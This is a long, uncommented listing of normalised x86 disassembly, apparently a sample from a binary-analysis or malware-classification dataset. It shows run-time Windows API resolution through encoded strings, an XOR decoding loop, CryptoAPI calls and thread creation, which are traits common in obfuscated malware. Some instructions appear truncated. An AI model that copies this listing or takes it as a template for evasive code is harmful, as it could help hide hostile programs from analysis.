test eax eax
je r-xdata
lea edx [ ebp - 0x6c ]
mov eax 0x9a
call sub_10045930
lea edi [ ebp - 0x1c ]
mov eax 0x10
call sub_1005b580
lea edi [ ebp - 0x28 ]
mov eax 0xd8
call sub_1005b580
lea edi [ ebp - 0x44 ]
mov eax 0xcd
call sub_1005b580
lea edi [ ebp - 0x54 ]
mov eax 0xdb
call sub_1005b580
lea edi [ ebp - 0x34 ]
mov eax 0x6
call sub_1005b580
lea ecx [ ebp - 0x6c ]
push ecx
call [ LoadLibraryW@IAT ]
mov edi [ GetProcAddress@IAT ]
lea edx [ ebp - 0x1c ]
push edx
push eax
mov [ esi + 0x384 ] eax
call edi
mov ecx [ esi + 0x384 ]
mov [ esi + 0x388 ] eax
lea eax [ ebp - 0x28 ]
push eax
push ecx
call edi
lea edx [ ebp - 0x44 ]
mov [ esi + 0x38c ] eax
mov eax [ esi + 0x384 ]
push edx
push eax
call edi
mov edx [ esi + 0x384 ]
lea ecx [ ebp - 0x54 ]
push ecx
push edx
mov [ esi + 0x390 ] eax
call edi
mov ecx [ esi + 0x384 ]
mov [ esi + 0x394 ] eax
lea eax [ ebp - 0x34 ]
push eax
push ecx
call edi
mov [ esi + 0x398 ] eax
cmp [ esi + 0x388 ] ebx
je r-xdata
mov cx [ eax ]
add eax 0x2
cmp cx bx
jne r-xdata
sub eax edx
sar eax 0x1
push eax
lea edx [ ebp - 0x110 ]
push edx
lea ecx [ ebp - 0x294 ]
call sub_1005ddc0
mov [ ebp - 0x4 ] 0x1
jmp r-xdata
sub eax edx
sar eax 0x1
push eax
lea edx [ ebp - 0x120 ]
push edx
lea ecx [ ebp - 0x294 ]
call sub_1005ddc0
mov [ ebp - 0x4 ] esi
xor eax eax
jmp r-xdata
push esi
push edi
mov ecx [ esi + 0x388 ]
push sub_10067f10
push sub_10056a60
push sub_10054030
push sub_10059fd0
push sub_1001f0a0
push sub_10059d50
push sub_10048b80
push sub_10008b10
push sub_100187c0
lea eax [ esi + 0x10 ]
push sub_10068260
push eax
call ecx
xor edx edx
add esp 0x34
test eax eax
setne dl
mov [ esi + 0xc ] eax
mov eax edx
lea edx [ ebp - 0x170 ]
mov eax 0x151
mov [ esi + 0x384 ] ebx
call sub_10045930
push edx
lea ecx [ ebp - 0x2b0 ]
call sub_10054d00
lea edx [ ebp - 0x2b0 ]
mov ecx 0x6
mov [ ebp - 0x4 ] 0x2
call sub_100205a0
cmp [ ebp - 0x29c ] 0x8
jb r-xdata
cmp [ esi + 0x38c ] ebx
je r-xdata
lea edx [ ebp - 0x294 ]
mov ecx 0x6
call sub_100205a0
cmp [ ebp - 0x280 ] 0x8
jb r-xdata
mov eax [ ebp - 0x294 ]
push eax
call sub_100187af
add esp 0x4
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn 0x8
mov eax [ ebp - 0x2b0 ]
push eax
call sub_100187af
add esp 0x4
xor eax eax
jmp r-xdata
cmp [ esi + 0x390 ] ebx
je r-xdata
cmp [ esi + 0x394 ] ebx
je r-xdata
cmp eax ebx
jne r-xdata
sub_1000a4b0
lea ecx [ eax + eax * 2 ]
lea ecx [ ecx * 4 + r--data ]
xor eax eax
cmp [ ecx + 0x4 ] eax
jbe r-xdata
mov eax [ ecx + 0x4 ]
xor ecx ecx
mov [ edx + eax * 2 ] cx
retn
push esi
push edi
mov esi [ ecx ]
movsx esi [ esi + eax ]
movzx edi [ ecx + 0x8 ]
xor si di
xor si ax
mov edi 0xff
and si di
mov [ edx + eax * 2 ] si
inc eax
cmp eax [ ecx + 0x4 ]
jb r-xdata
pop edi
pop esi
sub_1000a500
push ebp
mov ebp esp
sub esp 0x14
push ebx
mov ebx eax
push esi
push edi
test ebx ebx
jne r-xdata
call sub_1000aaa0
test eax eax
je r-xdata
lea eax [ ebx + 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebx + 0x128 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x8 ] 0x0
test eax eax
je r-xdata
mov eax 0x2
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
mov ebx rw-data
mov [ ebp - 0xc ] rw-data
mov [ ebp - 0x4 ] ebx
mov edi [ eax ]
test edi edi
je r-xdata
mov eax 0x3
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
mov eax 0x4
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
test ebx ebx
je r-xdata
push eax
push ebx
call [ StrCpyW@IAT ]
mov eax [ ebp - 0xc ]
mov esi [ edi + 0x8 ]
push eax
add ebx 0x3cf0
call sub_1006fd40
add esp 0x4
test eax eax
jne r-xdata
mov eax 0x5
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov esi [ edi + 0xc ]
lea ecx [ eax + 0xb7fc ]
push ecx
lea ebx [ eax + 0x7b0c ]
call sub_10030e90
add esp 0x4
test eax eax
jne r-xdata
mov eax 0x6
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x8 ]
lea ecx [ eax + rw-data ]
test ecx ecx
je r-xdata
mov eax 0x7
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov dl [ edi + 0x10 ]
add [ ebp - 0xc ] 0x2
add [ ebp - 0x4 ] 0x208
mov [ ecx ] dl
mov ecx [ edi + 0x14 ]
mov [ eax * 4 + rw-data ] ecx
mov edx [ edi + 0x18 ]
mov ecx [ ebp - 0x10 ]
mov [ eax * 4 + rw-data ] edx
mov ecx [ ecx + 0x4 ]
inc eax
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x8 ] eax
test ecx ecx
je r-xdata
mov ebx [ ebp - 0x4 ]
mov eax ecx
jmp r-xdata
cmp [ ebp - 0x8 ] 0x1e
jae r-xdata
sub_1000a660
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x54
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x50 ] eax
push ebx
mov ebx [ ebp + 0x14 ]
mov eax [ ebx + 0x14 ]
push esi
push edi
mov edi [ ebp + 0x8 ]
mov esi ecx
mov ecx [ ebp + 0x1c ]
push ecx
push eax
push r--data
lea edx [ esp + 0x1c ]
push edx
push esi
call sub_10069d50
add esp 0x10
push eax
lea eax [ esp + 0x20 ]
push 0x40
push eax
call sub_1005c1c5
mov edx [ ebp + 0x18 ]
push eax
mov eax [ ebp + 0x10 ]
lea ecx [ esp + 0x2c ]
push ecx
mov ecx [ ebp + 0xc ]
push edx
push ebx
push eax
push ecx
push edi
push esi
call sub_100149a0
mov ecx [ esp + 0x8c ]
add esp 0x30
mov eax edi
pop edi
pop esi
pop ebx
xor ecx esp
call sub_10001e8b
mov esp ebp
pop ebp
retn 0x18
sub_1000a6dd
mov edi edi
push ebp
mov ebp esp
sub esp 0x14
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
and [ ebp - 0x10 ] 0x0
push ebx
push esi
mov esi [ ebp + 0x14 ]
mov eax ecx
mov ecx [ ebp + 0xc ]
push edi
mov edi [ ebp + 0x8 ]
add eax 0x8
push eax
push edi
mov [ esi ] ecx
mov ecx [ edi ]
lea eax [ ebp - 0xc ]
push 0x0
push eax
mov [ ebp - 0x14 ] ecx
call sub_10026e29
mov ebx eax
add esp 0x10
test ebx ebx
jg r-xdata
mov eax [ esi ]
mov ecx [ ebp + 0x10 ]
dec ebx
sub ecx eax
cmp ecx ebx
jge r-xdata
mov [ ebp - 0x10 ] 0x2
jmp r-xdata
test ebx ebx
jle r-xdata
mov eax [ ebp - 0x14 ]
mov [ edi ] eax
mov [ ebp - 0x10 ] 0x1
jmp r-xdata
mov ecx [ ebp - 0x4 ]
mov eax [ ebp - 0x10 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10001e8b
leave
retn 0x10
push ebx
lea ecx [ ebp - 0xc ]
push ecx
push eax
call sub_1007f5d0
add esp 0xc
add [ esi ] ebx
sub_1000a76c
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push [ ebp + 0x8 ]
call sub_1001cdb2
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ecx [ rw-data ]
movzx eax [ ecx + eax * 2 ]
and eax 0x4
pop ebp
retn
sub_1000a7a0
cmp [ rw-data ] 0x8
jb r-xdata
push esi
xor ecx ecx
mov esi rw-data
mov [ rw-data ] 0x7
mov [ rw-data ] 0x0
mov [ rw-data ] cx
call sub_100315f0
mov esi 0x8
cmp [ rw-data ] esi
jb r-xdata
mov eax [ rw-data ]
push eax
call sub_100187af
add esp 0x4
xor eax eax
cmp [ rw-data ] esi
mov [ rw-data ] 0x7
mov [ rw-data ] 0x0
mov [ rw-data ] ax
pop esi
jb r-xdata
mov edx [ rw-data ]
push edx
call sub_100187af
add esp 0x4
xor edx edx
mov [ rw-data ] 0x7
mov [ rw-data ] 0x0
mov [ rw-data ] dx
retn
mov ecx [ rw-data ]
push ecx
call sub_100187af
add esp 0x4
sub_1000a850
push ebp
mov ebp esp
fld [ ebp + 0x8 ]
mov ecx [ rw-data ]
fld [ r--data ]
fsubr st1
fstp [ ebp + 0x8 ]
fld [ ebp + 0x8 ]
fabs
fstp [ ebp + 0x8 ]
fld [ ebp + 0x8 ]
fld [ r--data ]
fcom st1
fnstsw ax
fstp st1
test ah 0x41
jne r-xdata
fld st1
fsub [ r--data ]
fstp [ ebp + 0x8 ]
fld [ ebp + 0x8 ]
fabs
fstp [ ebp + 0x8 ]
fld [ ebp + 0x8 ]
fcomp st1
fnstsw ax
test ah 0x5
jpe r-xdata
fstp st1
fstp st0
fldz
fstp [ ecx + 0xfc ]
pop ebp
retn 0x4
fld st1
fsub [ r--data ]
fstp [ ebp + 0x8 ]
fld [ ebp + 0x8 ]
fabs
fstp [ ebp + 0x8 ]
fld [ ebp + 0x8 ]
fcomp st1
fnstsw ax
test ah 0x5
jpe r-xdata
fstp st1
fstp st0
fld [ r--data ]
fstp [ ecx + 0xfc ]
pop ebp
retn 0x4
fxch st1
fsub [ r--data ]
fstp [ ebp + 0x8 ]
fld [ ebp + 0x8 ]
fabs
fstp [ ebp + 0x8 ]
fld [ ebp + 0x8 ]
fcompp
fnstsw ax
test ah 0x5
jpe r-xdata
fstp st1
fstp st0
fld1
fstp [ ecx + 0xfc ]
pop ebp
retn 0x4
pop ebp
retn 0x4
fld [ r--data ]
fstp [ ecx + 0xfc ]
sub_1000a924
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
push edi
call sub_10044649
cmp [ eax + 0x20c ] 0x0
mov eax [ ebp + 0x18 ]
mov ecx [ ebp + 0x8 ]
mov edi 0xe06d7363
mov esi 0x1fffffff
mov ebx 0x19930522
jne r-xdata
test [ ecx + 0x4 ] 0x66
je r-xdata
mov edx [ ecx ]
cmp edx edi
je r-xdata
cmp [ eax + 0xc ] 0x0
jne r-xdata
cmp [ eax + 0x4 ] 0x0
je r-xdata
cmp edx 0x80000026
je r-xdata
cmp [ ecx ] edi
jne r-xdata
mov edx [ eax ]
and edx esi
cmp edx 0x19930521
jb r-xdata
xor eax eax
inc eax
cmp [ ebp + 0x1c ] 0x0
jne r-xdata
mov edx [ eax ]
and edx esi
cmp edx ebx
jb r-xdata
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x24 ]
push eax
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push ecx
call sub_10081d33
add esp 0x20
cmp [ ecx + 0x10 ] 0x3
jb r-xdata
cmp [ eax + 0x1c ] 0x0
je r-xdata
push 0xffffffff
push eax
push [ ebp + 0x14 ]
push [ ebp + 0xc ]
call sub_10051c68
add esp 0x10
jmp r-xdata
test [ eax + 0x20 ] 0x1
jne r-xdata
cmp [ ecx + 0x14 ] ebx
jbe r-xdata
mov edx [ ecx + 0x1c ]
mov edx [ edx + 0x8 ]
test edx edx
je r-xdata
movzx esi [ ebp + 0x24 ]
push esi
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push eax
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push ecx
call edx
add esp 0x20
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
sub_1000aa0a
mov edi edi
push ebp
mov ebp esp
push [ ecx + 0xc ]
lea eax [ ebp + 0x14 ]
push 0x0
push eax
lea eax [ ebp + 0xc ]
push eax
call sub_1004c1a2
add esp 0x10
test eax eax
jns r-xdata
mov ecx [ ebp + 0x24 ]
sar eax 0x1
mov [ ecx + 0x10 ] eax
mov eax [ ebp + 0x20 ]
or [ eax ] 0x2
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
pop ebp
retn 0x20
sub_1000aa4a
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
lea eax [ ebp - 0x10 ]
push edi
push eax
mov ebx ecx
call sub_10024a46
mov esi eax
lea edi [ ebx + 0x8 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop ecx
movsd [ edi ] [ esi ]
call sub_10059d69
pop edi
pop esi
mov [ ebx + 0x18 ] eax
mov [ ebx + 0x1c ] edx
pop ebx
leave
retn 0x4
sub_1000aaa0
push ebp
mov ebp esp
push 0xffffffff
push sub_10087b66
mov eax [ fs : 0x0 ]
push eax
sub esp 0xc0
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov ecx ebx
call sub_1003f970
test eax eax
je r-xdata
mov ecx ebx
call sub_10006000
test eax eax
jne r-xdata
mov eax [ rw-data ]
push r--data
xor edi edi
mov ecx rw-data
call sub_1001a2f0
test eax eax
je r-xdata
mov eax 0x7
jmp r-xdata
mov ecx ebx
call sub_10021530
test eax eax
je r-xdata
xor edi edi
mov [ ebp - 0x98 ] 0xf
mov [ ebp - 0x9c ] edi
mov [ ebp - 0xac ] 0x0
lea edx [ ebp - 0x80 ]
lea eax [ edi + 0x65 ]
mov [ ebp - 0x4 ] edi
call sub_10053240
push edi
push 0x1
push edi
push edi
lea eax [ ebp - 0xcc ]
push eax
call [ CryptAcquireContextW@IAT ]
test eax eax
jne r-xdata
push 0xffffffff
push edi
push rw-data
lea ecx [ ebx + 0x40 ]
call sub_100404a0
mov edi ebx
call sub_10017fc0
test eax eax
je r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
mov ecx ebx
call sub_100474f0
mov ecx ebx
call sub_10003510
mov ecx ebx
call sub_10033fe0
test eax eax
je r-xdata
mov eax 0x8
jmp r-xdata
mov eax [ ebp - 0xcc ]
lea edx [ ebp - 0x18 ]
push edx
push 0x6
push eax
call [ CryptGenRandom@IAT ]
push edi
test eax eax
jne r-xdata
cmp [ ebp - 0x98 ] 0x10
jb r-xdata
lea edx [ ebp - 0x80 ]
mov eax 0xdd
call sub_10053240
mov eax 0x5
jmp r-xdata
mov ecx ebx
call sub_1005df30
test eax eax
je r-xdata
lea edx [ ebp - 0x80 ]
mov eax 0x6c
call sub_10053240
mov eax 0x6
jmp r-xdata
mov edx [ ebp - 0xcc ]
push edx
call [ CryptReleaseContext@IAT ]
test eax eax
jne r-xdata
mov ecx [ ebp - 0xcc ]
push ecx
call [ CryptReleaseContext@IAT ]
lea ecx [ ebp - 0xac ]
call sub_1004c8c0
mov eax 0x2
jmp r-xdata
mov eax 0x1
jmp r-xdata
mov ecx [ ebp - 0xac ]
push ecx
call sub_100187af
add esp 0x4
mov ecx ebx
call sub_1001f2f0
test eax eax
je r-xdata
lea edx [ ebp - 0x80 ]
mov eax 0x71
call sub_10053240
push 0x6
lea ecx [ ebp - 0x18 ]
lea esi [ ebp - 0xc8 ]
call sub_10006b30
add esp 0x4
push eax
lea ecx [ ebp - 0xac ]
mov [ ebp - 0x4 ] 0x1
call sub_10021bf0
mov ecx esi
mov [ ebp - 0x4 ] 0x0
call sub_1004c8c0
cmp [ ebp - 0x98 ] 0x10
mov eax [ ebp - 0xac ]
jae r-xdata
lea ecx [ ebp - 0xac ]
call sub_1004c8c0
mov eax 0x3
jmp r-xdata
call sub_10053090
mov esi eax
test esi esi
jne r-xdata
lea edx [ ebp - 0x88 ]
mov eax 0x17
call sub_10053240
push 0x9
lea ecx [ ebp - 0x2c ]
push ecx
push 0xffffffff
push eax
push 0x1
push edi
call [ MultiByteToWideChar@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp - 0xac ]
push 0x0
lea edx [ ebx + 0x138 ]
push ebx
mov ecx esi
call sub_100028a0
test eax eax
je r-xdata
lea eax [ esi + 0x9 ]
jmp r-xdata
lea edx [ ebx + 0x40 ]
push edx
lea edx [ ebp - 0x2c ]
call sub_100453a0
mov edi ebx
call sub_10017fc0
test eax eax
je r-xdata
lea ecx [ ebp - 0xac ]
call sub_1004c8c0
mov eax 0x4
jmp r-xdata
push esi
call [ LocalFree@IAT ]
push ebx
call sub_10051f30
test eax eax
je r-xdata
lea edx [ ebp - 0x80 ]
mov eax 0xc1
call sub_10053240
lea ecx [ ebp - 0xac ]
mov [ ebp - 0x4 ] 0xffffffff
call sub_1004c8c0
lea edx [ ebp - 0x80 ]
mov eax 0xdd
call sub_10053240
lea ecx [ ebp - 0xac ]
call sub_1004c8c0
mov eax 0x5
jmp r-xdata
push ebx
call sub_1006e750
test eax eax
je r-xdata
lea edx [ ebp - 0x90 ]
mov eax 0xfc
call sub_10053240
mov eax 0xb
jmp r-xdata
mov ecx ebx
call sub_10040cc0
test eax eax
je r-xdata
lea edx [ ebp - 0x78 ]
mov eax 0x25
call sub_10053240
mov eax 0xc
jmp r-xdata
xor eax eax
lea edx [ ebp - 0x90 ]
mov eax 0x6
call sub_10053240
mov eax 0xd
jmp r-xdata
sub_1000adf0
push ebp
mov ebp esp
push 0xffffffff
push sub_10087f20
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
push 0x144
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
xor eax eax
push eax
call sub_10055110
jmp r-xdata
mov ecx [ ebp + 0x8 ]
push ecx
mov ecx [ ebp + 0xc ]
call sub_1005db80
mov [ ebp - 0x4 ] edi
mov esi [ ebp - 0x10 ]
test eax eax
je r-xdata
mov [ ebp - 0x4 ] edi
mov esi [ ebp - 0x10 ]
test esi esi
je r-xdata
or edi 0xffffffff
mov [ ebp - 0x4 ] edi
push eax
lea ecx [ ebp - 0x14 ]
mov [ ebp - 0x14 ] 0x0
mov [ ebp - 0x10 ] 0x0
call sub_10023120
mov [ ebp - 0x4 ] 0x1
mov edx [ ebp - 0x14 ]
test edx edx
jne r-xdata
test esi esi
je r-xdata
test esi esi
je r-xdata
mov eax 0x1
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x8
lea eax [ esi + 0x4 ]
mov ecx edi
[ eax ] ecx
jne r-xdata
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x8
lea ecx [ esi + 0x4 ]
mov edx edi
[ ecx ] edx
jne r-xdata
mov eax 0x2
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x8
lea edx [ esi + 0x4 ]
mov eax edi
[ edx ] eax
jne r-xdata
mov edx [ esi ]
mov eax [ edx ]
mov ecx esi
call eax
lea ecx [ esi + 0x8 ]
[ ecx ] edi
jne r-xdata
mov eax [ esi ]
mov edx [ eax ]
mov ecx esi
call edx
lea eax [ esi + 0x8 ]
[ eax ] edi
jne r-xdata
mov edx [ esi ]
mov eax [ edx ]
mov ecx esi
call eax
lea ecx [ esi + 0x8 ]
[ ecx ] edi
jne r-xdata
mov edx [ esi ]
mov eax [ edx + 0x4 ]
mov ecx esi
call eax
mov edx [ esi ]
mov eax [ edx + 0x4 ]
mov ecx esi
call eax
mov edx [ esi ]
mov eax [ edx + 0x4 ]
mov ecx esi
call eax
sub_1000af50
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
mov ecx [ ebp + 0x18 ]
push ebx
mov ebx [ ebp + 0x14 ]
push esi
mov esi [ ebp + 0x20 ]
mov [ ebx ] eax
mov [ esi ] ecx
mov edx [ ebx ]
push edi
cmp edx [ ebp + 0x10 ]
je r-xdata
mov ecx [ ebp + 0xc ]
xor eax eax
cmp ecx [ ebx ]
pop edi
pop esi
sete al
pop ebx
pop ebp
retn 0x1c
mov edi [ ebp + 0x1c ]
cmp [ esi ] edi
je r-xdata
mov eax [ ebx ]
movzx edx [ eax ]
cmp edx 0x10ffff
ja r-xdata
pop edi
pop esi
mov eax 0x2
pop ebx
pop ebp
retn 0x1c
cmp edx 0x80
jae r-xdata
mov ecx edx
cmp edx 0x800
jae r-xdata
mov cl dl
xor eax eax
jmp r-xdata
cmp edx 0x10000
jae r-xdata
shr ecx 0x6
or cl 0xc0
mov eax 0x1
jmp r-xdata
mov ebx [ ebp + 0x8 ]
cmp [ ebx ] 0x0
jne r-xdata
cmp edx 0x200000
jae r-xdata
shr ecx 0xc
or cl 0xe0
mov eax 0x2
jmp r-xdata
sub edi [ esi ]
lea ebx [ eax + 0x1 ]
cmp edi ebx
mov ebx [ ebp + 0x14 ]
jl r-xdata
mov [ ebx ] 0x1
cmp edx 0x4000000
jae r-xdata
shr ecx 0x12
or cl 0xf0
mov eax 0x3
jmp r-xdata
add [ ebx ] 0x2
mov edi [ esi ]
mov [ edi ] cl
inc [ esi ]
mov edi [ esi ]
test eax eax
jle r-xdata
shr ecx 0x1e
or cl 0xfc
mov eax 0x5
shr ecx 0x18
or cl 0xf8
mov eax 0x4
jmp r-xdata
mov edx [ ebx ]
cmp edx [ ebp + 0x10 ]
jne r-xdata
lea ecx [ eax + eax * 2 ]
add ecx ecx
jmp r-xdata
sub ecx 0x6
mov ebx edx
shr ebx cl
dec eax
mov [ ebp + 0x20 ] ecx
and bl 0x3f
or bl 0x80
mov [ edi ] bl
inc [ esi ]
mov edi [ esi ]
test eax eax
jg r-xdata
mov ecx [ ebp + 0x20 ]
mov ebx [ ebp + 0x14 ]
sub_1000b079
mov edi edi
push ebp
mov ebp esp
sub esp 0x2c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push esi
push edi
mov edi [ ebp + 0xc ]
push 0x16
pop esi
push esi
lea ecx [ ebp - 0x1c ]
push ecx
lea ecx [ ebp - 0x2c ]
push ecx
push [ eax + 0x4 ]
push [ eax ]
call sub_1001af63
add esp 0x14
test edi edi
jne r-xdata
push ebx
mov ebx [ ebp + 0x10 ]
test ebx ebx
jne r-xdata
call sub_1006299d
mov [ eax ] esi
call sub_100427ff
mov eax esi
jmp r-xdata
or eax 0xffffffff
cmp ebx eax
je r-xdata
call sub_1006299d
mov [ eax ] esi
call sub_100427ff
mov eax esi
jmp r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_10001e8b
leave
retn
mov esi [ ebp + 0x14 ]
lea ecx [ ebp - 0x2c ]
push ecx
mov ecx [ ebp - 0x28 ]
add ecx esi
push ecx
push eax
xor eax eax
cmp [ ebp - 0x2c ] 0x2d
sete al
add eax edi
push eax
call sub_1001dbcd
add esp 0x10
test eax eax
je r-xdata
xor ecx ecx
cmp [ ebp - 0x2c ] 0x2d
mov eax ebx
sete cl
sub eax ecx
pop ebx
push [ ebp + 0x18 ]
lea eax [ ebp - 0x2c ]
push 0x0
push esi
push ebx
mov ecx edi
call sub_10082e13
add esp 0x10
mov [ edi ] 0x0
jmp r-xdata
sub_1000b13a
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
mov eax [ edi + 0x10 ]
mov esi [ edi + 0xc ]
mov [ ebp - 0x4 ] eax
mov ebx esi
jmp r-xdata
mov [ ebp + 0x8 ] esi
cmp esi 0xffffffff
jne r-xdata
mov eax [ ebp + 0x14 ]
inc esi
mov [ eax ] esi
mov eax [ ebp + 0x18 ]
mov [ eax ] ebx
cmp ebx [ edi + 0xc ]
ja r-xdata
mov ecx [ ebp + 0x10 ]
dec esi
mov eax esi
imul eax eax 0x14
add eax [ ebp - 0x4 ]
cmp [ eax + 0x4 ] ecx
jge r-xdata
call sub_1002f519
call sub_1002f519
cmp esi ebx
jbe r-xdata
cmp esi 0xffffffff
jne r-xdata
cmp ecx [ eax + 0x8 ]
jle r-xdata
mov eax esi
imul eax eax 0x14
add eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
leave
retn
cmp [ ebp + 0xc ] 0x0
jge r-xdata
dec [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
sub_1000b1b0
push ebp
mov ebp esp
sub esp 0x228
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x8 ] eax
push edi
push 0x104
lea eax [ ebp - 0x224 ]
mov edi ecx
mov ecx [ esi + 0x4 ]
push eax
push ecx
call [ ExpandEnvironmentStringsW@IAT ]
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov ecx [ edi ]
push eax
push ecx
lea eax [ ebp - 0x224 ]
call sub_10005c30
add esp 0x8
test eax eax
jne r-xdata
lea edx [ ebp - 0x18 ]
mov eax 0x8e
call sub_10045930
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
lea edx [ ebp - 0x1c ]
mov eax 0x4a
call sub_10045930
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
lea edx [ ebp - 0x18 ]
push edx
call [ lstrlenW@IAT ]
lea edi [ eax + eax ]
lea eax [ edi + 0x2 ]
push eax
push 0x40
call [ LocalAlloc@IAT ]
lea ecx [ ebp - 0x18 ]
push eax
call [ LocalFree@IAT ]
mov [ esi + 0x8 ] 0x0
lea edx [ ebp - 0x1c ]
push edx
call [ lstrlenW@IAT ]
lea edi [ eax + eax ]
lea eax [ edi + 0x2 ]
push eax
push 0x40
call [ LocalAlloc@IAT ]
lea ecx [ ebp - 0x1c ]
jmp r-xdata
push eax
call [ LocalFree@IAT ]
mov [ esi + 0x8 ] 0x0
push edi
push ecx
push eax
mov [ esi + 0x8 ] eax
call sub_1007f5d0
add esp 0xc
push esi
xor ecx ecx
xor edx edx
call sub_1001f7d0
mov ecx [ ebp - 0x8 ]
xor ecx ebp
pop edi
call sub_10001e8b
mov esp ebp
pop ebp
retn 0x4
sub_1000b29e
mov edi edi
push ebp
mov ebp esp
push ebx
push edi
mov edi [ ebp + 0x10 ]
xor ebx ebx
test edi edi
jne r-xdata
push esi
call sub_10013143
push 0x214
push 0x1
call sub_10067d3a
mov esi eax
pop ecx
pop ecx
test esi esi
je r-xdata
call sub_1006299d
mov [ eax ] 0x16
call sub_100427ff
xor eax eax
jmp r-xdata
push esi
call sub_10035d06
pop ecx
test ebx ebx
je r-xdata
call sub_10044649
push [ eax + 0x6c ]
push esi
call sub_1002be1e
mov eax [ ebp + 0x14 ]
or [ esi + 0x4 ] 0xffffffff
mov [ esi + 0x58 ] eax
mov eax [ ebp + 0x1c ]
pop ecx
pop ecx
mov [ esi + 0x54 ] edi
test eax eax
jne r-xdata
pop edi
pop ebx
pop ebp
retn
xor eax eax
push ebx
call sub_1001e7b9
pop ecx
push eax
push [ ebp + 0x18 ]
push esi
push sub_1007f0e8
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ CreateThread@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp + 0x10 ]
pop esi
call [ GetLastError@IAT ]
mov ebx eax
sub_1000b33e
mov edi edi
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
cmp ebx 0xffffffe0
ja r-xdata
push ebx
call sub_10046ed7
pop ecx
call sub_1006299d
mov [ eax ] 0xc
xor eax eax
push esi
push edi
test ebx ebx
je r-xdata
call sub_1001f6d0
push 0x1e
call sub_100134bc
push 0xff
call sub_10069aed
xor eax eax
inc eax
mov eax ebx
jmp r-xdata
mov eax edi
pop edi
pop esi
jmp r-xdata
push 0xc
pop esi
cmp [ rw-data ] eax
je r-xdata
push eax
push 0x0
push [ rw-data ]
call [ HeapAlloc@IAT ]
mov edi eax
test edi edi
jne r-xdata
pop ebx
pop ebp
retn
call sub_1006299d
mov [ eax ] esi
push ebx
call sub_10046ed7
pop ecx
test eax eax
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
jmp r-xdata
call sub_1006299d
mov [ eax ] esi
sub_1000b3d2
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
push edi
push [ ebp + 0x8 ]
xor edi edi
mov [ ebp - 0xc ] edi
call sub_1007fa90
mov esi eax
mov eax [ ebp + 0x8 ]
inc esi
pop ecx
mov ebx esi
